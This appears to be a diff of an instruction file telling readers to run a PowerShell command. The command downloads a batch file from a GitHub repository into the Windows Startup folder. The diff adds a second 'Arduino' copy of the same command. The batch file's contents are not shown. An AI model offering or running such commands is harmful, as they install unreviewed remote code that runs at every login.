@@ -1,3 +1,6 @@
 Run this command:
 
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/installer.bat', [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'installer.bat'))"
+
+Arduino:
+powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/installer.bat', [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), 'installer.bat'))\"
